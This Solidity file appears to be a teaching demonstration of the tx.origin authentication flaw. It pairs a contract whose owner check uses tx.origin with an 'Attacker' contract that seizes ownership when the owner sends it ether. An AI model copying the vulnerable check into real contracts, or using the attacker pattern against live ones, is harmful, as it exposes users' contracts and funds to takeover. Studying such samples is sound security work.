//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract MyContract {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(owner == tx.origin, "Caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }

}

contract Attacker {

    address badUser;
    MyContract target;

    constructor(address _addr) {
        badUser = msg.sender;
        target = MyContract(_addr);
    }

    receive() external payable {
        target.transferOwnership(badUser);
    }
}
